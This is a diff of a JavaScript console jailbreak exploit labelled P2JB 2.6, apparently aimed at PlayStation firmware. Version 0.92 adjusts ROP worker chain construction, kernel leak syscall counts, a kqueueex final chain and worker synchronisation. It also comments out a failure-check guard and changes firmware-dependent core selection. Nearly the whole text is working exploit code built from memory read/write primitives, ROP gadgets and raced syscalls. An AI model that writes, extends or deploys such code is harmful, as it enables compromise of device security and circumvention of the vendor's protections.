@@ -153,7 +153,7 @@
     }
 
     try {
-        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69) v0.91";
+        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69) v0.92";
 
         const PAGE_SIZE = 0x4000;
 
@@ -335,7 +335,7 @@
         let failcheck_path = null;
 
         let LEAK_CORES = [0, 1, 2, 3];
-        let LEAK_SYSCALLS_FINAL = 0x0Fn;
+        let LEAK_SYSCALLS_FINAL = 0n;
 
         function my_init_threading() {
             const jmpbuf = malloc(0x60);
@@ -626,10 +626,13 @@
         }
 
         function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
-            const STACK_SIZE = 0x10000;
+            const STACK_SIZE = 0x4000 + 0xA00 * 8;
             const buf = malloc(STACK_SIZE);
-            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
+            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
+            const chain_view = new BigUint64Array(chain_ab);
+            chain_view.fill(0n, 0, 0x800);
             const entry = buf + 0x4000n;
+            const ENTRY_START = 0x800;
 
             const cmd_addr = ws.cmd;
             const awake_addr = ws.awake + BigInt(wid * 8);
@@ -637,7 +640,7 @@
             const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;
 
             let idx = 0;
-            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
+            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
             const at = (i) => entry + BigInt(i * 8);
 
             emit(ROP.ret);
@@ -1011,16 +1014,33 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = 512;
-            const U = BigInt(LEAK_UNROLL);
-
             const NW = LEAK_CORES.length;
             const FEED_CHUNK = 4096;
 
             const chunkbuf = malloc(FEED_CHUNK);
 
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
-            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
+            const cross_worker_rem = TOTAL_SYSCALLS - base_share * BigInt(NW);
+
+            const base_share_num = Number(base_share);
+            let best_unroll = 512;
+            let best_rem = base_share_num % 512;
+            for (let u = 513; u <= 1024; u++) {
+                const r = base_share_num % u;
+                if (r < best_rem) {
+                    best_rem = r;
+                    best_unroll = u;
+                    if (r === 0) break;
+                }
+            }
+
+            const LEAK_UNROLL = best_unroll;
+            const U = BigInt(LEAK_UNROLL);
+            const per_worker_rem = base_share % U;
+            const leak_remainder = per_worker_rem * BigInt(NW) + cross_worker_rem;
+            LEAK_SYSCALLS_FINAL += leak_remainder;
+            logger.log("prepare_fds: LEAK_UNROLL=" + LEAK_UNROLL + " per_worker_rem=" + per_worker_rem + " leak_remainder=" + leak_remainder + " LEAK_SYSCALLS_FINAL=" + toHex(LEAK_SYSCALLS_FINAL));
+
             const lws = [];
 
             const rt_prio = malloc(4);
@@ -1028,19 +1048,19 @@
             write16_uncompressed(rt_prio + 2n, 256n);
 
             for (let w = 0; w < NW; w++) {
-                const target_w = base_share + (w === 0 ? extra0 : 0n);
+                const target_w = base_share - per_worker_rem;
                 const bplus1_w = target_w / U;
                 const normal_w = bplus1_w - 1n;
-                const remainder_w = target_w - bplus1_w * U;
                 const [pr, pw] = create_pipe();
                 const rfd = Number(pr), wfd = Number(pw);
 
                 syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                 const finished = malloc(8); write64_uncompressed(finished, 0n);
                 const dummybuf = malloc(8);
+                logger.log("prepare_fds: worker " + w + " target_w=" + target_w + " normal_w=" + normal_w);
                 const chain = build_leak_worker_chain(
                     LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
-                    Number(remainder_w), rt_prio);
+                    0, rt_prio);
                 spawn_leak_worker(chain.entry);
                 lws.push({
                     chain, rfd, wfd, wfd_big: BigInt(wfd),
@@ -1053,6 +1073,8 @@
             const _sleep_ts = malloc(16);
             write64_uncompressed(_sleep_ts,      5n);           // tv_sec  = 5
             write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0
+
+            const _fionread_buf = malloc(4);
 
             _cr_enable_caching();
 
@@ -1077,41 +1099,56 @@
 
             logger.log("feeding done, waiting for workers to finish");
 
-            for (const lw of lws) {
-                write64_uncompressed(lw.finished, 0n);
-            }
             while (true) {
                 nanosleep_ms(3000);
-                let all_idle = true;
+                let all_drained = true;
+
                 for (const lw of lws) {
-                    if (read64_uncompressed(lw.finished) !== 0n) {
-                        all_idle = false;
-                        write64_uncompressed(lw.finished, 0n);
+                    syscall(SYSCALL.ioctl, lw.rfd_big, 0x4004667fn, _fionread_buf);
+                    const qdepth = Number(read32_uncompressed(_fionread_buf));
+                    if (qdepth > 0) {
+                        all_drained = false;
                     }
                 }
-                if (all_idle) break;
+                if (all_drained) break;
             }
-            logger.log("all workers idle, updating pivot");
+            logger.log("all worker queues drained");
+
             for (const lw of lws) {
+                while (true) {
+                    write64_uncompressed(lw.finished, 0n);
+                    nanosleep_ms(1500);
+                    if (read64_uncompressed(lw.finished) === 0n) break;
+                }
+            }
+            logger.log("all workers idle");
+            for (let i = 0; i < lws.length; i++) {
+                logger.log("pivoting worker " + i + " to exit");
+                const lw = lws[i];
                 write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                 write64_uncompressed(lw.finished, 0n);
                 syscall(SYSCALL.write, lw.wfd_big, chunkbuf, 1n);
-            }
-            for (let i = 0; i < lws.length; i++) {
-                const lw = lws[i];
+
                 const dl = Date.now() + 15000;
-                while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
-                    nanosleep_ms(500);
-                if (read64_uncompressed(lw.finished) !== EXIT_MARK) {
+                while (true) {
+                    let mark = read64_uncompressed(lw.finished);
+                    logger.log("worker " + i + " mark " + toHex(mark));
+                    if (mark === EXIT_MARK || Date.now() > dl) break;
+                    nanosleep_ms(1000);
+                }
+                if (read64_uncompressed(lw.finished) === EXIT_MARK) {
+                    logger.log("worker " + i + " reached EXIT_MARK");
+                } else {
                     logger.log("worker " + i + " timeout waiting for EXIT_MARK");
                 }
                 syscall(SYSCALL.close, lw.rfd_big);
                 syscall(SYSCALL.close, lw.wfd_big);
+                logger.log("worker " + i + " finalized");
             }
 
             if (LEAK_SYSCALLS_FINAL > 0n) {
-                nanosleep_ms(5000);
                 logger.log("launching kqueueex final chain len=" + toHex(LEAK_SYSCALLS_FINAL) + " on the main thread");
+                nanosleep_ms(5000);
                 execute_kqueueex_final_chain(LEAK_SYSCALLS_FINAL);
                 logger.log("kqueueex final chain finished successfully");
             }
@@ -2059,17 +2096,17 @@
                 return;
             }
 
-            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
-            if (file_exists(failcheck_path)) {
-                logger.log("aborting, failcheck path exists: " + failcheck_path);
-                return;
-            }
-            write_file(failcheck_path, "");
+            // failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
+            // if (file_exists(failcheck_path)) {
+            //     logger.log("aborting, failcheck path exists: " + failcheck_path);
+            //     return;
+            // }
+            // write_file(failcheck_path, "");
         } catch (_) { failcheck_path = null; }
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
 
-        if (compare_version(FW_VERSION, "11.0") >= 0) {
+        if (compare_version(FW_VERSION, "12.0") >= 0) {
             LEAK_CORES = [0, 1];
         }
 
